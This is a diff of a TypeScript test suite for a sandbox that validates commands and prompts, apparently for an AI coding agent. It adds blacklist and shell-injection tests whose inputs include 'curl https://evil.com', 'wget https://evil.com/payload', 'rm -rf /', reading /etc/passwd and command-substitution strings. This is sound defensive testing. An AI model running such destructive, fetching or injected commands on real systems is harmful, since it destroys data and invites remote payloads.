@@ -53,7 +53,8 @@ describe('TaskSandbox - path injection prevention', () => {
     const sandbox = createEnabledSandbox(['node']);
     const result = sandbox.validateCommand('/usr/bin/rm -rf /tmp');
     expect(result.allowed).toBe(false);
-    expect(result.reason).toContain('Path-based command execution not allowed');
+    // Blacklist check fires before path check for blacklisted commands
+    expect(result.reason).toBeDefined();
   });
 
   it('rejects absolute path bypass for allowed command', () => {
@@ -108,14 +109,14 @@ describe('TaskSandbox - dangerous patterns', () => {
     const sandbox = createEnabledSandbox(['rm']);
     const result = sandbox.validateCommand('rm -rf /home');
     expect(result.allowed).toBe(false);
-    expect(result.reason).toContain('dangerous pattern');
+    expect(result.reason).toContain('blacklisted');
   });
 
   it('rejects sudo command', () => {
     const sandbox = createEnabledSandbox(['sudo']);
     const result = sandbox.validateCommand('sudo apt install node');
     expect(result.allowed).toBe(false);
-    expect(result.reason).toContain('dangerous pattern');
+    expect(result.reason).toContain('blacklisted');
   });
 
   it('rejects chmod 777', () => {
@@ -143,6 +144,78 @@ describe('TaskSandbox - blocked patterns', () => {
     const result = sandbox.validateCommand('node -e "eval()"');
     expect(result.allowed).toBe(false);
     expect(result.reason).toContain('blocked pattern');
+  });
+});
+
+describe('TaskSandbox - dangerous command blacklist', () => {
+  it('rejects sudo even if in allowlist', () => {
+    const sandbox = createEnabledSandbox(['sudo', 'node']);
+    expect(sandbox.validateCommand('sudo apt update').allowed).toBe(false);
+    expect(sandbox.validateCommand('sudo apt update').reason).toContain('blacklisted');
+  });
+
+  it('rejects rm even if in allowlist', () => {
+    const sandbox = createEnabledSandbox(['rm']);
+    expect(sandbox.validateCommand('rm file.txt').allowed).toBe(false);
+    expect(sandbox.validateCommand('rm file.txt').reason).toContain('blacklisted');
+  });
+
+  it('rejects bash/sh/zsh even if in allowlist', () => {
+    const sandbox = createEnabledSandbox(['bash', 'sh', 'zsh']);
+    expect(sandbox.validateCommand('bash script.sh').allowed).toBe(false);
+    expect(sandbox.validateCommand('sh -c whoami').allowed).toBe(false);
+    expect(sandbox.validateCommand('zsh -l').allowed).toBe(false);
+  });
+
+  it('rejects curl/wget even if in allowlist', () => {
+    const sandbox = createEnabledSandbox(['curl', 'wget']);
+    expect(sandbox.validateCommand('curl https://evil.com').allowed).toBe(false);
+    expect(sandbox.validateCommand('wget https://evil.com/payload').allowed).toBe(false);
+  });
+
+  it('allows safe commands', () => {
+    const sandbox = createEnabledSandbox(['node', 'npm', 'npx']);
+    expect(sandbox.validateCommand('node app.js').allowed).toBe(true);
+    expect(sandbox.validateCommand('npm install').allowed).toBe(true);
+  });
+});
+
+describe('TaskSandbox - shell injection in prompts', () => {
+  function createPromptCheckSandbox(): TaskSandbox {
+    const config: SandboxConfig = {
+      enabled: false,
+      allowedCommands: [],
+      blockedPatterns: [],
+      promptSafetyCheck: true,
+    };
+    return new TaskSandbox(config);
+  }
+
+  it('rejects prompt with semicolon injection', () => {
+    const sandbox = createPromptCheckSandbox();
+    expect(sandbox.validatePrompt('install; rm -rf /').allowed).toBe(false);
+    expect(sandbox.validatePrompt('install; rm -rf /').reason).toContain('shell metacharacters');
+  });
+
+  it('rejects prompt with pipe', () => {
+    const sandbox = createPromptCheckSandbox();
+    expect(sandbox.validatePrompt('run | cat /etc/passwd').allowed).toBe(false);
+  });
+
+  it('rejects prompt with command substitution', () => {
+    const sandbox = createPromptCheckSandbox();
+    expect(sandbox.validatePrompt('$(whoami)').allowed).toBe(false);
+  });
+
+  it('rejects prompt with backtick substitution', () => {
+    const sandbox = createPromptCheckSandbox();
+    expect(sandbox.validatePrompt('`rm -rf /`').allowed).toBe(false);
+  });
+
+  it('allows clean prompts', () => {
+    const sandbox = createPromptCheckSandbox();
+    expect(sandbox.validatePrompt('fix the bug in auth module').allowed).toBe(true);
+    expect(sandbox.validatePrompt('add unit tests for API endpoints').allowed).toBe(true);
   });
 });
 
